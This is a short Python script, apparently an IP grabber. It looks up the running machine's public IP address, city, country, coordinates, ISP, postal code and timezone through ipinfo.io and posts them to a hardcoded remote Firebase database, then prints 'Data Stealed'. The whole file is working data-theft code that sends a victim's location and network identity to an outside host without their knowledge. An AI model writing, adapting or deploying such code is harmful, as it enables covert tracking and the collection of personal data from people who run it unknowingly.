from firebase import firebase
import requests
import sys

res:object = requests.get('https://ipinfo.io/')
data = res.json()
firebase = firebase.FirebaseApplication(
        "https://pythonfirebase-ed150-default-rtdb.asia-southeast1.firebasedatabase.app/",
        None,
)
IPAddr = data['ip']
city = data['city']
country = data['country']
location = data['loc'].split(',')
latitude = location[0]
longitude = location[1]
org = data['org']
postal = data['postal']
timezone = data['timezone']

IPData = {
        "IP-Address": IPAddr,
        "City": city,
        "Country": country,
        "Latitude": latitude,
        "Longitude": longitude,
        "Organizer": org,
        "Postal": postal,
        "Timezone": timezone
}
    
result = firebase.post("/DataIP", IPData)
print(result)
    
print("Data Stealed")
input("Program Ended")
sys.exit()
